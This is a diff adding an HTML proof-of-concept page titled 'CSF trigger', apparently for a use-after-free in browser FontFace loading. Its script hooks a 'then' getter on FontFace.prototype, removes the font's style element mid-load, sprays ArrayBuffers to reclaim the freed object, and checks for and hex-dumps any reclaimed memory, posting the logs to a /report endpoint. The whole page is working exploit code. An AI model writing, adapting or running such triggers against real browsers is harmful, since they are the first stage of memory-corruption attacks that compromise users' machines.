@@ -1,0 +1,43 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CSF trigger</title>
+<style>body{margin:0;padding:18px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
+#o{white-space:pre-wrap;font:12px/1.5 ui-monospace,monospace;color:#9fb4d6}</style></head>
+<body><div id="s">CSF</div><pre id="o"></pre><script>
+var out=document.getElementById("o"),LOG=[];
+function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
+var _rt=0;function log(s){out.textContent+=s+"\n";LOG.push(s);try{if(_rt)clearTimeout(_rt);_rt=setTimeout(send,300);}catch(e){}}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function hex8(v){return("00000000"+(v>>>0).toString(16)).slice(-8);}
+function dump(ab){var u=new Uint8Array(ab),l=[];for(var i=0;i+8<=u.length;i+=8){var lo=(u[i]|u[i+1]<<8|u[i+2]<<16|u[i+3]<<24)>>>0,hi=(u[i+4]|u[i+5]<<8|u[i+6]<<16|u[i+7]<<24)>>>0;l.push("+"+("000"+i.toString(16)).slice(-3)+"  "+hex8(hi)+" "+hex8(lo));}return l.join("\n");}
+async function run(){
+  log("UA: "+navigator.userAgent);
+  var st=document.createElement("style");
+  st.textContent="@font-face{font-family:Trig;src:local(Helvetica);}";
+  document.head.append(st); void document.body.offsetHeight;
+  var face=null; for(var f of document.fonts){if(f.family.replaceAll(/['"]/g,"")==="Trig"){face=f;break;}}
+  log("face: "+(face?"found":"missing")); if(!face)return;
+  void face.loaded;
+  var fired=false,sprayed=false,spray=[],old=FontFace.prototype.then;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==face)return undefined;
+    fired=true; log("getter fired");
+    st.remove(); void document.body.offsetHeight;
+    for(var i=0;i<0x80;i++){var ab=new ArrayBuffer(0xb8),dv=new DataView(ab);try{dv.setUint32(8,1,true);dv.setUint8(0x7a,3);}catch(e){}spray.push(ab);}
+    sprayed=true; return undefined;}});
+  log("calling face.load()");
+  var loadReturned=false;
+  try{face.load();}catch(e){log("load threw: "+e.message);}
+  loadReturned=true;
+  log("load returned; fired="+fired+" (sync="+(fired?"true":"false")+")");
+  await sleep(800);
+  log("settled; fired="+fired+" sprayed="+sprayed);
+  var hit=null;
+  for(var j=0;j<spray.length;j++){var u=new Uint8Array(spray[j]),dirty=false;
+    for(var k=0;k<u.length;k++){if(u[k]!==0&&k!==8&&k!==9&&k!==10&&k!==11&&k!==0x7a){dirty=true;break;}}
+    var rc=new DataView(spray[j]).getUint32(8,true);
+    if(dirty||rc===2){hit={ab:spray[j],dirty:dirty,rc:rc};break;}}
+  if(hit){log("HIT dirty="+hit.dirty+" refcount="+hit.rc);log("object:\n"+dump(hit.ab));}
+  else log("no reclaim");
+  log("done");
+}
+run();
+</script></body></html>
